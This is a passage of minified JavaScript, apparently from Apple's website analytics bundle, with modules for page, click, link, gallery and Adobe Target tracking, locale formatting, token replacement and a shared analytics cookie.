\s{2,}|&nbsp;)+/g},regexp:{curlyBracePattern:/[{|}]/g,storeUrlPattern:/^(https?:\/\/.*\.apple\.com)?(\/[a-z\-_0-9]*)?\/shop(\/.*)?$/i,tokenPattern:/(\{[a-zA-Z][\w-]+?\})/g}};module.exports=Object.freeze(constants)},{"@apple/analytics-data-layer":46}],360:[function(require,module,exports){const regions=require("./trackers/regions/regions"),Tracker=require("./Tracker"),defaultOptions={clearRegions:!0};module.exports=function destroy(options={}){(options={...defaultOptions,...options}).clearRegions&&regions.clearRegions(),Tracker.AppMeasurement.destroy(options)}},{"./Tracker":358,"./trackers/regions/regions":412}],361:[function(require,module,exports){const domNodes=require("@marcom/ac-dom-nodes"),errorHandler=require("../ErrorHandler"),storeUrlPattern=require("../constants").storeUrlPattern;module.exports={isIntraPageLink:function isIntraPageLink(element){let href;return!domNodes.isNodeType(element,domNodes.NODE_TYPES.ELEMENT)||(!element.href||(href=element.getAttribute("href").trim(),"#"===href.charAt(0)||0===href.indexOf("javascript:")||0===href.indexOf("mailto:")||0===href.indexOf("tel:")||(!!(element.classList.contains("ac-gn-link-search")||element.classList.contains("ac-gn-link-bag")||element.classList.contains("globalnav-link-search")||element.classList.contains("globalnav-link-bag"))||!!(element.hasAttribute("data-analytics-intrapage-link")||element.hasAttribute("data-analytics-id")||element.hasAttribute("data-analytics-video-id")))))},isStoreLink:function isStoreLink(url){if("string"!=typeof url&&errorHandler.log("appMeasurementPluginHelper-DOM","isStoreLink",url+" is not a valid string"),!errorHandler.exception)return storeUrlPattern.test(url)},getLinkHref:function getLinkHref(targetEl){return targetEl.getAttribute("href")||""}}},{"../ErrorHandler":356,"../constants":359,"@marcom/ac-dom-nodes":260}],362:[function(require,module,exports){const utils=require("@apple/analytics-utils"),cookieJson=utils.cookieJson,beaconHelpers=utils.beaconHelpers,toStr=utils.toStr,cookieOpts={path:"/",domain:"apple.com",secure:!0};function sanitizeBeacon(beacon){return Object.keys(beacon).forEach((key=>{const type=key.substring(0,4),value=toStr(beacon[key]);"prop"===type?beacon[key]=value.substring(0,100):"eVar"===type&&(beacon[key]=value.substring(0,250))})),beacon}module.exports={getSharedCookie:function getSharedCookie(options={}){options=Object.assign({},cookieOpts,options);const data=cookieJson.get("mk_epub");return cookieJson.set("mk_epub",null,options),data},setSharedCookie:function setSharedCookie(beacon,options={}){options=Object.assign({},cookieOpts,options),beaconHelpers.isNotEmpty(beacon)&&cookieJson.set("mk_epub",sanitizeBeacon(beacon),options)},sanitizeBeacon:sanitizeBeacon,updateCookieOptions:function updateCookieOptions(domain){cookieOpts.domain=domain}}},{"@apple/analytics-utils":190}],363:[function(require,module,exports){const dataLayer=require("@apple/analytics-data-layer"),constants=require("../constants"),errorHandler=require("../ErrorHandler"),init=dataLayer.init,set=dataLayer.set;module.exports={refresh:function refresh(options){const{key:key,selector:selector,keyAttribute:keyAttribute,keyPrefix:keyPrefix,valueAttribute:valueAttribute}=constants.dataLayer.meta;if(init(constants.dataLayer),options.sourceData){const bucket0Data=options.sourceData["s-bucket-0"],bucket1Data=options.sourceData["s-bucket-1"],bucket2Data=options.sourceData["s-bucket-2"],channelData=options.sourceData["s-channel"],trackData=options.sourceData.track;return bucket0Data&&bucket1Data&&bucket2Data&&channelData&&trackData?set(key,options.sourceData):void errorHandler.log(`Missing page data passed - cannot initialize. |bucket0 - ${bucket0Data}|bucket1 - ${bucket1Data}|bucket2 - ${bucket2Data}|channel - ${channelData}|track - ${trackData}`)}const result={},metas=document.querySelectorAll(selector);for(let i=0;i<metas.length;i++){result[metas[i].getAttribute(keyAttribute).replace(keyPrefix,"")]=metas[i].getAttribute(valueAttribute)}set(key,result)}}},{"../ErrorHandler":356,"../constants":359,"@apple/analytics-data-layer":46}],364:[function(require,module,exports){const errorHandler=require("../ErrorHandler");module.exports=function dataStringToObject(str){if(!str)return errorHandler.log("dataAttributeHelper","dataStringToObject","`str` must not be falsey"),{};if("string"!=typeof str||0===str.length)return errorHandler.log("dataAttributeHelper","dataStringToObject","`str` must contain a value and be of type string"),{};let parsedStr;try{parsedStr=JSON.parse(str)}catch(e){}if(parsedStr)return parsedStr;const dataObj={},keyValuePairs=str.split(",");for(let keyValuePair of keyValuePairs){const[key,value]=keyValuePair.split(":").map((splitStr=>splitStr.trim()));value||dataObj.dataAttrValue?dataObj[key]=value:dataObj.dataAttrValue=key}return dataObj}},{"../ErrorHandler":356}],365:[function(require,module,exports){const isEmptyString=require("./isEmptyString");let eventListeners={},keyIncrementor=0;module.exports={dynamicEventBinder:({parentSelector:parentSelector,eventType:eventType,childSelector:childSelector,callback:callback,exactMatch:exactMatch}={})=>{if(("function"!=typeof callback||isEmptyString(parentSelector)||isEmptyString(eventType)||isEmptyString(childSelector))&&parentSelector!==window)return;if(parentSelector===window){const node=window;keyIncrementor++;const handler=event=>{callback(event)};return eventListeners[keyIncrementor]={node:node,type:eventType,handler:handler},void node.addEventListener(eventType,handler)}document.querySelectorAll(parentSelector).forEach((node=>{const handler=event=>{const target=event.target;if(exactMatch)target.matches(childSelector)&&(event.dynamicEventBinderTarget=target);else{const child=target.closest(childSelector);node.contains(child)&&(event.dynamicEventBinderTarget=child,callback(event))}};keyIncrementor++,eventListeners[keyIncrementor]={node:node,type:eventType,handler:handler},node.addEventListener(eventType,handler)}))},removeListeners:function removeListeners(){eventListeners&&(Object.keys(eventListeners).forEach((key=>{!function removeListener(key){eventListeners[key].node.removeEventListener(eventListeners[key].type,eventListeners[key].handler),delete eventListeners[key]}(key)})),eventListeners={})}}},{"./isEmptyString":372}],366:[function(require,module,exports){module.exports=function eventsToString(events){return events&&"string"!==events&&events.toString?events.toString():events}},{}],367:[function(require,module,exports){function filterByPage(options){return options.trackOnPageLoad||!options.trackOnExitLink}function filterByExit(options){return options.trackOnExitLink||!options.trackOnPageLoad}function filterByMicroEvent(options){return!options.trackOnPageLoad&&!options.trackOnExitLink}module.exports=function filterBeaconsByType(data,type){let beaconFilter;switch(type){case"page":beaconFilter=filterByPage;break;case"exit":beaconFilter=filterByExit;break;case"micro-event":beaconFilter=filterByMicroEvent;break;default:return}return data.filter((item=>{const opts=item.options;return beaconFilter(opts)}))}},{}],368:[function(require,module,exports){const errorHandler=require("../ErrorHandler"),moduleName="appMeasurementPluginFormatter",separator=require("./separator");function legacyCountryCode(locale){let legacy;const customCountryCode={"fr-be":"bf","nl-be":"bl","fr-ch":"cr","de-ch":"ce","en-419":"la","es-419":"la","en-gb":"uk"};return legacy=customCountryCode[locale]?customCountryCode[locale]:_getCountryCodeFromLocale(locale),legacy}function lowerCaseString(str){return"string"==typeof str&&(str=str.toLowerCase()),str}function _getCountryCodeFromLocale(locale){if(locale||errorHandler.log(moduleName,"_getCountryCodeFromLocale","locale should be a valid string"),errorHandler.exception)return;const temp=_transformLocale(locale);let country;return temp.length>1&&(country=lowerCaseString(temp[1])),country}const whitelist=/[]/g;function _sanitize(value){return"string"==typeof value&&(value=value.replace(whitelist,"")),value}function _transformLocale(locale){return locale.split(/[-_]/)}module.exports={productName:function productName(value){return lowerCaseString(value)},channel:function channel(value,locale){if(value||errorHandler.log(moduleName,"channel","analytics-s-channel metadata tag must exist"),errorHandler.exception)return;value=value.toLowerCase().split(" ").join(".");let prefix="www.";const customCountryCodeFormat={"fr-ca":"ca.fr"};return prefix+=customCountryCodeFormat[locale]?customCountryCodeFormat[locale]:legacyCountryCode(locale),prefix+"."+value},pageName:function pageName(originalPageName,locale){let suffix="";const customCode={"fr-ca":"ca-fr"}[locale];return originalPageName=originalPageName||"","string"==typeof locale&&(locale=locale.toLowerCase(),suffix=customCode||legacyCountryCode(locale),suffix=function _decorateCountryCode(countryCode){countryCode||errorHandler.log(moduleName,"_decorateCountryCode","countryCode should be a valid string");if(errorHandler.exception)return;return" ("+lowerCaseString(countryCode)+")"}(suffix)),lowerCaseString(originalPageName)+suffix},eventString:function eventString(prefix,suffix){return suffix=suffix||"",(prefix=prefix||"")?prefix+"@"+suffix:suffix},countryCodeFilter:function countryCodeFilter(locale){let translated;const customCountryFilter={"fr-ca":"ca/fr","en-419":"lae","es-419":"la","en-ap":"asia","en-gb":"uk"};if(customCountryFilter[locale])translated=customCountryFilter[locale];else if(["fr-be","nl-be","fr-ch","de-ch"].indexOf(locale)>=0){translated=_transformLocale(locale).reverse().join("-")}else translated=_getCountryCodeFromLocale(locale);return translated},legacyCountryCode:legacyCountryCode,cleanProps:function cleanProps(properties){const cleanProperties={};if("object"==typeof properties)for(const key in properties)cleanProperties[key]=_sanitize(properties[key]);return cleanProperties},stringReplacer:function stringReplacer(str,target,replaceWith){let transformedStr=str;return target="string"==typeof target?target:"",replaceWith="string"==typeof replaceWith?replaceWith:"","string"==typeof transformedStr&&(transformedStr=transformedStr.replace(new RegExp(target,"gi"),replaceWith)),transformedStr},lowerCaseString:lowerCaseString,getRegionAncestry:function getRegionAncestry(data){let regionAncestry="";return Array.isArray(data.regionAncestry)&&data.regionAncestry.forEach((function(region){regionAncestry+=region.name+separator.pipe})),regionAncestry}}},{"../ErrorHandler":356,"./separator":380}],369:[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,dataLayerConfig=require("../constants").dataLayer.configuration,constants=require("../constants"),specialExitLinkList=[{name:"deploy",url:"deploy.apple.com"},{name:"ade",url:"ade.apple.com"},{name:"appleteacher",url:"appleteacher.apple.com"},{name:"ecommerce",url:"ecommerce.apple.com"},{name:"school",url:"school.apple.com"},{name:"help",url:"help.apple.com"},{name:"survey",url:"survey.apple.com"},{name:"itunespartner",url:"itunespartner.apple.com"},{name:"investor",url:"investor.apple.com"},{name:"consultants",url:"consultants.apple.com"},{name:"itms",url:"itms.apple.com"},{name:"artists",url:"artists.apple.com"},{name:"itunes",url:"itunes.apple.com"},{name:"tv",url:"tv.apple.com"},{name:"contactretail",url:"contactretail.apple.com"}];module.exports=function specialExitLinks(){const trackingDomain=get([dataLayerConfig.key,dataLayerConfig.keys.trackingDomain]);trackingDomain&&trackingDomain===constants.primaryDomain&&specialExitLinkList.push({name:"apple.com.cn",url:"apple.com.cn"});let specialExitLinkString="";return specialExitLinkList.forEach((item=>{specialExitLinkString+=item.name+"~"+item.url+"|"})),specialExitLinkString=specialExitLinkString.slice(0,-1),specialExitLinkString}},{"../constants":359,"@apple/analytics-data-layer":46}],370:[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,passiveTrackerPath=require("../constants").dataLayer.paths.passiveTracker;module.exports=function getPassiveTrackerData(){let data=get(passiveTrackerPath);if(data)try{return JSON.parse(data)}catch(e){}}},{"../constants":359,"@apple/analytics-data-layer":46}],371:[function(require,module,exports){module.exports=obj=>0===Object.keys(obj).length&&obj.constructor===Object},{}],372:[function(require,module,exports){const toStr=require("@apple/analytics-utils").toStr;module.exports=checkingString=>""===toStr(checkingString).trim()},{"@apple/analytics-utils":190}],373:[function(require,module,exports){module.exports=function isFirstPageView(){return void 0===window.sessionStorage.fpv&&(window.sessionStorage.fpv=0,!function isAppleReferred(){return/\.apple\.com/.test(document.referrer)}())}},{}],374:[function(require,module,exports){module.exports=function isNumeric(val){return!isNaN(val)}},{}],375:[function(require,module,exports){"use strict";module.exports=function isStorageAvailable(type){try{const storage=window[type],testItem="acAnalyticsStorageTestItem";return storage.setItem(testItem,"a"),storage.removeItem(testItem),!0}catch(e){return!1}}},{}],376:[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,set=require("@apple/analytics-data-layer").set,deferredPath=require("../constants").dataLayer.paths.deferred,merge=require("@apple/analytics-merge-beacons").merge,biscuitTin=require("@apple/analytics-biscuit-tin"),{parseEventCollectionString:parseEventCollectionString}=require("@apple/analytics-omniture-collection");function provideEventsString(events){return events?"string"==typeof events?events:events.toString?events.toString():"":""}module.exports=function mergeIntoDeferredBeacon(beacon){const deferredBeacon=get(deferredPath);if(deferredBeacon){beacon.events=provideEventsString(beacon.events),deferredBeacon.events=provideEventsString(deferredBeacon.events);const mergedEventsData=merge({target:{events:parseEventCollectionString(deferredBeacon.events)},source:{events:parseEventCollectionString(beacon.events)}});"string"==typeof beacon.events&&(beacon.events=mergedEventsData.events.toString()),beacon=merge({target:deferredBeacon,source:beacon})}set(deferredPath,beacon),biscuitTin.store()}},{"../constants":359,"@apple/analytics-biscuit-tin":27,"@apple/analytics-data-layer":46,"@apple/analytics-merge-beacons":94,"@apple/analytics-omniture-collection":105}],377:[function(require,module,exports){const{parseEventCollectionString:parseEventCollectionString}=require("@apple/analytics-omniture-collection");module.exports=function mergePassiveTrackerData(data){return data&&(data.length>1?(data.sort(((a,b)=>b.options.priority-a.options.priority)),data=function mergeData(data){return data=data.reduce(((merged,currentItem)=>{const mergedData=function mergeItem(original,overwrite){return{...original,...overwrite}}(merged,currentItem);if(merged.events&&currentItem.events){const eventsData=parseEventCollectionString(merged.events);eventsData.merge(parseEventCollectionString(currentItem.events)),mergedData.events=eventsData.toString()}return mergedData})),delete data.options,data}(data)):data=data[0]),data}},{"@apple/analytics-omniture-collection":105}],378:[function(require,module,exports){module.exports=function onDocumentReady(func){"complete"===document.readyState?func():document.addEventListener("readystatechange",(function _documentReadyCallback(){"complete"===document.readyState&&(func(),document.removeEventListener("readystatechange",_documentReadyCallback))}))}},{}],379:[function(require,module,exports){const tokenReplacer=require("./tokens/tokenReplacer"),dataStringToObject=require("./dataStringToObject"),isNode=require("@marcom/ac-dom-nodes/isNode");module.exports=function parseFromDataAttribute(dataAttrValue,el){let dataObj,tokensArr,translatedStr,replacements={};return tokensArr=tokenReplacer.parseTokens(dataAttrValue),tokensArr&&0!==tokensArr.length?(replacements=function _getTokenValues(el,tokensArr){const replacements={};let value;const len=tokensArr.length;let i=0;if(isNode(el))for(i=0;i<len;i++)el.getAttribute(tokensArr[i])&&(value=el.getAttribute(tokensArr[i]),replacements[tokensArr[i]]=value);return replacements}(el,tokensArr),translatedStr=tokenReplacer.replace(dataAttrValue,replacements),dataObj=dataStringToObject(translatedStr),dataObj):dataStringToObject(dataAttrValue)}},{"./dataStringToObject":364,"./tokens/tokenReplacer":385,"@marcom/ac-dom-nodes/isNode":267}],380:[function(require,module,exports){module.exports={pipe:" | ",hyphen:" - ",colon:": ",dot:".",space:" "}},{}],381:[function(require,module,exports){const DOMHelper=require("./DOM");module.exports={async:function async(data){let isAsync=!0;return DOMHelper.isIntraPageLink(data.targetEl)||(isAsync=!1),isAsync}}},{"./DOM":361}],382:[function(require,module,exports){module.exports=function setProperty(beacon,key,value){void 0===beacon[key]&&void 0!==value&&(beacon[key]=value)}},{}],383:[function(require,module,exports){const get=require("@apple/analytics-data-layer").get,formatter=require("./formatter"),dataLayerConfig=require("../constants").dataLayer.configuration;module.exports={set:function set(){return[{name:"{PAGE_NAME}",value:get([dataLayerConfig.key,dataLayerConfig.keys.computedPageName])},{name:"{PAGE_NAME_NO_LOCALE}",value:get([dataLayerConfig.key,dataLayerConfig.keys.pageName])},{name:"{CHANNEL}",value:get([dataLayerConfig.key,dataLayerConfig.keys.channel])},{name:"{CAMPAIGN}",value:get([dataLayerConfig.key,dataLayerConfig.keys.computedCampaign])},{name:"{COUNTRY_CODE}",value:get([dataLayerConfig.key,dataLayerConfig.keys.legacyCountryCode])},{name:"{COUNTRY_CODE_FILTER}",value:get([dataLayerConfig.key,dataLayerConfig.keys.countryCodeFilter])},{name:"{PRODUCT_NAME}",value:get([dataLayerConfig.key,dataLayerConfig.keys.productName])},{name:"{PLATFORM}",value:get([dataLayerConfig.key,dataLayerConfig.keys.platform])}]},translate:function translate(str,templateVarArr){return"string"==typeof str&&templateVarArr.forEach((templateVar=>{templateVar.name&&"string"==typeof templateVar.name&&str.toLowerCase().indexOf(templateVar.name.toLowerCase())>-1&&(str=formatter.stringReplacer(str,templateVar.name,templateVar.value))})),str}}},{"../constants":359,"./formatter":368,"@apple/analytics-data-layer":46}],384:[function(require,module,exports){"use strict";const errorHandler=require("../../ErrorHandler");module.exports=new class TokenRegistry{constructor(){this.tokens={},this._size=0}setToken(tokenName,tokenValue){"string"!=typeof tokenName&&errorHandler.log("TokenRegistry","setToken",`${tokenName} is not a valid string`),"string"!=typeof tokenValue&&errorHandler.log("TokenRegistry","setToken",`${tokenValue} is not a valid string`),errorHandler.exception||(this.tokens[tokenName]=tokenValue,this._updateSize())}removeToken(tokenName){"string"!=typeof tokenName&&errorHandler.log("TokenRegistry","removeToken",tokenName+" is not a valid string"),this.tokens[tokenName]||errorHandler.log("TokenRegistry","removeToken",tokenName+" doesnt exist"),errorHandler.exception||(delete this.tokens[tokenName],this._updateSize())}getToken(tokenName){if("string"!=typeof tokenName&&errorHandler.log("TokenRegistry","getToken",tokenName+" is not a valid string"),!errorHandler.exception)return this.tokens[tokenName]}size(){return this._size}clear(){this.tokens={},this._size=0}_updateSize(){this._size=Object.keys(this.tokens).length}}},{"../../ErrorHandler":356}],385:[function(require,module,exports){"use strict";const tokenPattern=require("../../constants").tokenPattern,curlysPattern=require("../../constants").curlysPattern,tokenRegistry=require("./Registry"),errorHandler=require("../../ErrorHandler");module.exports=new class TokenReplacer{constructor(){this.registry=tokenRegistry}replace(str,replacements){if("string"!=typeof str&&errorHandler.log("TokenReplacer","replace",str+" is not a valid string"),!errorHandler.exception)return"object"==typeof replacements&&(str=this._replace(str,replacements)),this.registry.size()>0&&(str=this._replace(str,this.registry.tokens)),str}parseTokens(str){let tokens;if("string"!=typeof str&&errorHandler.log("TokenReplacer","parseTokens",str+" is not a valid string"),!errorHandler.exception)return tokens=str.match(tokenPattern),tokens?tokens.map((value=>this._removeCurlys(value))):void 0}_replace(str,replacements){return str.replace(tokenPattern,(match=>"string"==typeof replacements[this._removeCurlys(match)]?replacements[this._removeCurlys(match)]:match))}_removeCurlys(str){return(str=str.trim()).replace(curlysPattern,"")}}},{"../../ErrorHandler":356,"../../constants":359,"./Registry":384}],386:[function(require,module,exports){const PageObserver=require("./observers/Page"),LinkObserver=require("./observers/Link"),ClickObserver=require("./observers/Click"),SectionObserver=require("./observers/Section"),ElementEngagementObserver=require("./observers/ElementEngagement"),onDocumentReady=require("./helpers/onDocumentReady"),AdobeTargetObserver=require("./observers/AdobeTarget"),isNode=require("@marcom/ac-dom-nodes").isNode,defaults={onDOMContentLoadedOptions:{section:{autoEnable:!1},globalNav:{autoEnable:!1,initListener(){const acGlobalNav=document.querySelector("#globalnav");acGlobalNav?this.onEnableListenerCallback({detail:{target:acGlobalNav}}):window.addEventListener("globalnav:mounted",this.onEnableListenerCallback.bind(this))}}},onPageDataLoadedOptions:{page:{},click:{},link:{}},compatibilityMode:!1};module.exports=function initialize(options){options||(options=function getSettings(){if(window.acAnalyticsSettings)return isNode(window.acAnalyticsSettings)?function getSettingsFromDOM(){const script=document.getElementById("acAnalyticsSettings");if(script)try{return JSON.parse(script.innerHTML)}catch(error){}}():window.acAnalyticsSettings}()),options&&options.compatibilityMode&&(options=function setLegacySettings(options){const reportSuites="applestoreww",pageName=function getLegacyPageName(){const metaTags=document.getElementsByTagName("meta");for(let metaTag,i=0;metaTag=metaTags[i];i++)if("omni_page"===metaTag.getAttribute("name"))return metaTag.getAttribute("content").toLowerCase();const title=document.title,host=window.location.hostname;let pathName=window.location.pathname,pageName=title.toLowerCase();/\s-\s/.test(pageName)&&(pageName=pageName.replace(/\s*-?\s*(apple|||||apple|)\s+[^-]*-?\s*/,""));pathName.match(/^\/(ws|pr|g5|go|ta|wm)\//)||(pathName=pathName.replace(/^\/(\w{2}|befr|benl|chfr|chde|asia|lae)(?=\/)/,""));!(pathName.match(/\//g).length<=2)||pathName.match(/support/)||host.match(/support/)||host.match(/selfsolve/)||!pathName.match(/index\.html/)&&pathName.match(/\.html/)||(pageName+=" - index");/\/pr\//.test(pathName)&&(pageName="pr - "+pageName);return pageName}(),locale=function getLocale(){if(document&&document.documentElement){const htmlLang=document.documentElement.getAttribute("data-locale")||document.documentElement.lang;if(htmlLang)return htmlLang;const globalNav=document.getElementById("globalnav")||document.getElementById("ac-globalnav");if(globalNav){const globalNavLang=globalNav.getAttribute("lang");if(globalNavLang)return globalNavLang}const segmentBar=document.getElementById("globalmessage-segment")||document.getElementById("ac-gn-segmentbar");if(segmentBar){const segmentBarLang=segmentBar.getAttribute("lang");if(segmentBarLang)return segmentBarLang}const globalFooter=document.getElementById("ac-globalfooter");if(globalFooter){const globalFooterLang=globalFooter.getAttribute("lang");if(globalFooterLang)return globalFooterLang}const ogLocale=document.querySelector('meta[property="og:locale"]');if(ogLocale){const ogLocaleContent=ogLocale.getAttribute("content").split("_").join("-");if(ogLocaleContent)return ogLocaleContent}}}(),channel=function getChannel(){let channel;window&&window.location&&window.location.pathname&&(channel=window.location.pathname.split("/")[1]);""===channel&&(channel="root");return channel}(),defaultValues={"s-bucket-0":reportSuites,"s-bucket-1":reportSuites,"s-bucket-2":reportSuites,"s-channel":channel,track:pageName,locale:locale};options||(options={});options.onPageDataLoadedOptions||(options.onPageDataLoadedOptions={});options.onPageDataLoadedOptions.page||(options.onPageDataLoadedOptions.page={});options.onPageDataLoadedOptions.page.sourceData||(options.onPageDataLoadedOptions.page.sourceData={});return options.onPageDataLoadedOptions.page.sourceData={...defaultValues,...options.onPageDataLoadedOptions.page.sourceData},options}(options));const onPageDataLoadedObservers=function onPageDataLoaded(options){return{page:new PageObserver(options.page),link:new LinkObserver(options.link),click:new ClickObserver(options.click),adobeTarget:new AdobeTargetObserver}}((options=options?{...defaults,...options}:defaults).onPageDataLoadedOptions),onDOMContentLoadedObservers=function onDOMContentLoaded(options){const observers={section:new SectionObserver(options.section),globalNav:new ElementEngagementObserver(options.globalNav)};return onDocumentReady((()=>{Object.keys(observers).forEach((observer=>{observers[observer].enable()}))})),observers}(options.onDOMContentLoadedOptions);return{...onPageDataLoadedObservers,...onDOMContentLoadedObservers}}},{"./helpers/onDocumentReady":378,"./observers/AdobeTarget":387,"./observers/Click":388,"./observers/ElementEngagement":389,"./observers/Link":392,"./observers/Page":393,"./observers/Section":394,"@marcom/ac-dom-nodes":260}],387:[function(require,module,exports){const Tracker=require("../Tracker"),observerRegistry=require("./observerRegistry"),isFirstPageView=require("../helpers/isFirstPageView"),merge=require("@apple/analytics-passive-tracker").merge,get=require("@apple/analytics-data-layer").get,passiveTrack=require("../passiveTracker");module.exports=class AdobeTargetObserver{constructor(){this.observerType="target",observerRegistry.add(this),this.tracker=Tracker,this.isEnabled=!0,this.isFirstPageView=isFirstPageView(),this.listenForTargetEvent()}listenForTargetEvent(){document.addEventListener("at-content-rendering-succeeded",this.track.bind(this)),window.ac_target&&window.ac_target.data&&this.track()}track(){const targetData=function getTargetData(){if(!window||!window.ac_target)return;const data=window.ac_target.data,tracked=window.ac_target.tracked;if(!data||tracked)return;return window.ac_target.tracked=!0,data}(),pageName=get("conf.pageName")?get("conf.pageName"):"";this.tracker&&targetData&&(this.isFirstPageView?this.passivelyTrack(targetData,pageName):this.tracker.trackGeneric({title:"abtnnb",eVar57:`${targetData}:${pageName}`.toLowerCase()}))}passivelyTrack(targetData,pageName){const beacon={eVar57:`${targetData}:${pageName}`.toLowerCase()};merge("beacon",beacon),passiveTrack(beacon)}}},{"../Tracker":358,"../helpers/isFirstPageView":373,"../passiveTracker":397,"./observerRegistry":396,"@apple/analytics-data-layer":46,"@apple/analytics-passive-tracker":126}],388:[function(require,module,exports){const ancestor=require("@marcom/dom-traversal/ancestor"),acDomNodes=require("@marcom/ac-dom-nodes"),Tracker=require("../Tracker"),errorHandler=require("../ErrorHandler"),EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,observerRegistry=require("./observerRegistry"),defaultOptions={dataAttribute:"analytics-click",titleDataAttribute:"analytics-title",autoEnable:!0},exitLinkPattern=/^https?:\/\/|^\/\//i;module.exports=class ClickAnalyticsObserver extends EventEmitterMicro{constructor(options={}){super(options),this.options={...defaultOptions,...options},this.observerType="click",observerRegistry.add(this),this.tracker=Tracker,this.isEnabled=!1,this._boundOnInteraction=this._onInteraction.bind(this),this._elements=null,!0===this.options.autoEnable&&this.enable()}enable(){errorHandler.exception||this.isEnabled||(this.addListener(),this.isEnabled=!0,this.trigger("enabled"))}addListener(){document.body.addEventListener("click",this._boundOnInteraction)}removeListener(){document.body.removeEventListener("click",this._boundOnInteraction)}_onInteraction(e){let linkAncestor,targetEl=e.target;targetEl.getAttribute("data-"+this.options.dataAttribute)||(linkAncestor=ancestor(targetEl,"[data-"+this.options.dataAttribute+"]"),linkAncestor&&(targetEl=linkAncestor)),targetEl.classList.contains("ac-gn-link-bag")||targetEl.classList.contains("globalnav-link-bag")||"ac-gn-link-search"===targetEl.id||"ac-gn-link-search-small"===targetEl.id||"globalnav-menubutton-link-search"===targetEl.id||targetEl.hasAttribute("href")&&"A"===targetEl.tagName&&!targetEl.hasAttribute("data-analytics-intrapage-link")&&exitLinkPattern.test(targetEl.getAttribute("href"))||targetEl.getAttribute("data-"+this.options.dataAttribute)&&this.track(e,targetEl)}track(e,targetEl){if(!this.tracker)return;const data={};acDomNodes.isNodeType(targetEl,acDomNodes.NODE_TYPES.ELEMENT)||errorHandler.log("ClickAnalyticsObserver","track",targetEl+" is not a valid DOM element"),errorHandler.exception||(data.targetEl=targetEl,this.tracker.track({type:"click",event:e,data:data,options:JSON.parse(JSON.stringify(this.options))}))}destroy(){this.removeListener(),this.options=null,this.tracker=null,this.isEnabled=null,this._boundOnInteraction=null,this._elements=null,observerRegistry.remove(this)}}},{"../ErrorHandler":356,"../Tracker":358,"./observerRegistry":396,"@marcom/ac-dom-nodes":260,"@marcom/ac-event-emitter-micro":281,"@marcom/dom-traversal/ancestor":293}],389:[function(require,module,exports){const EventEmitterMicro=require("@marcom/ac-event-emitter-micro").EventEmitterMicro,Tracker=require("../Tracker"),{defaultOptions:eeoDefaultOptions,ElementEngagementObserver:EEO}=require("@marcom/element-engagement-observer"),defaultOptions={...eeoDefaultOptions,initListener(){this.onEnableListenerCallback({detail:{target:document.body}})}};module.exports=class ElementEngagementObserver extends EventEmitterMicro{constructor(options){super(options),this.options=Object.assign(defaultOptions,options),this.tracker=Tracker}enable(){this.options.initListener.call(this)}onEnableListenerCallback(evt){const{detail:detail}=evt,{target:target}=detail||evt;this.options.target=target,this.elementEngagementObserver=new EEO({...this.options,autoEnable:!0,track:this.track.bind(this)})}track(d){const{engagementTitle:engagementTitle,target:target}=d,data=Object.assign({},d);data.engagementTitle=engagementTitle,data.target=target;const trackingData={type:"elementEngagement",observer:this,options:this.options,data:data};this.tracker.track(trackingData)}}},{"../Tracker":358,"@marcom/ac-event-emitter-micro":281,"@marcom/element-engagement-observer":296}],390:[function(require,module,exports){const errorHandler=require("../ErrorHandler"),Tracker=require("../Tracker"),observerRegistry=require("./observerRegistry"),defaultOptions={interactionEvents:[],interactionEventCallbacks:{}};module.exports=class EventAnalyticsObserver{constructor(targetObj,options={}){targetObj&&"object"==typeof targetObj&&"function"==typeof targetObj.on&&"function"==typeof targetObj.off||errorHandler.log("EventAnalyticsObserver",null,targetObj+" does not appear to be a valid EventEmitter"),this.options={...defaultOptions,...options},this.observerType="event",observerRegistry.add(this),Array.isArray(this.options.interactionEvents)||errorHandler.log("EventAnalyticsObserver",null,this.options.interactionEvents+" is not an array"),this.tracker=Tracker,this.targetObj=targetObj,this._callbacks={},this.attachEvents()}attachEvents(){if(errorHandler.exception)return;const options=this.options;let interactionEventCallback;options.interactionEvents.forEach((function(interactionEvent){interactionEventCallback=options.interactionEventCallbacks[interactionEvent],interactionEventCallback="function"==typeof interactionEventCallback?interactionEventCallback:this.track.bind(this),this._callbacks[interactionEvent]=interactionEventCallback,this.addListener(interactionEvent,interactionEventCallback)}),this)}detachEvents(){Object.keys(this._callbacks).forEach((function(callbackName){this.removeListener(callbackName,this._callbacks[callbackName])}),this)}addListener(eventType,callback){this.targetObj.on(eventType,callback)}removeListener(eventType,callback){this.targetObj.off(eventType,callback)}track(data){this.tracker&&this.tracker.track({type:"custom",data:data,options:this.options})}destroy(){this.detachEvents(),this.options=null,this.tracker=null,this.targetObj=null,this._callbacks=null,observerRegistry.remove(this)}}},{"../ErrorHandler":356,"../Tracker":358,"./observerRegistry":396}],391:[function(require,module,exports){const Tracker=require("../Tracker"),get=require("@apple/analytics-data-layer").get,errorHandler=require("../ErrorHandler"),dataLayerConfig=require("../constants").dataLayer.configuration,confKey=dataLayerConfig.key,observerRegistry=require("./observerRegistry"),defaultOptions={trackAutoRotate:!1,beforeUpdateEvent:"willShow",afterUpdateEvent:"didShow"},moduleName="GalleryAnalyticsObserver";module.exports=class GalleryAnalyticsObserver{constructor(gallery,options={}){gallery&&"object"==typeof gallery||errorHandler.log(moduleName,null,gallery+" is not an object"),this.options={...defaultOptions,...options},this.observerType="gallery",observerRegistry.add(this),this.gallery=gallery,this.tracker=Tracker,this.trackedInteractionTypes=[],this.outgoingSlideInteractionType="auto",this.incomingSlideTimestamp=get([confKey,dataLayerConfig.keys.initialTimeStamp]),this._onUpdate=this._onUpdate.bind(this),this._onComplete=this.track.bind(this),this.addListener()}addListener(){errorHandler.exception||(this.options.beforeUpdateEvent&&this.gallery.on(this.options.beforeUpdateEvent,this._onUpdate),this.options.afterUpdateEvent&&this.gallery.on(this.options.afterUpdateEvent,this._onComplete))}removeListener(){this.options.beforeUpdateEvent&&this.gallery.off(this.options.beforeUpdateEvent,this._onUpdate),this.options.afterUpdateEvent&&this.gallery.off(this.options.afterUpdateEvent,this._onComplete)}_createInteractionEvent(evt){let interactionEvent=evt.interactionEvent.originalEvent||evt.interactionEvent;return interactionEvent?{type:interactionEvent.type,target:interactionEvent.target,srcElement:interactionEvent.srcElement}:null}_onUpdate(d){this.interactionEvent=null,d.interactionEvent&&(this.interactionEvent=this._createInteractionEvent(d))}_getSlideId(slide){let 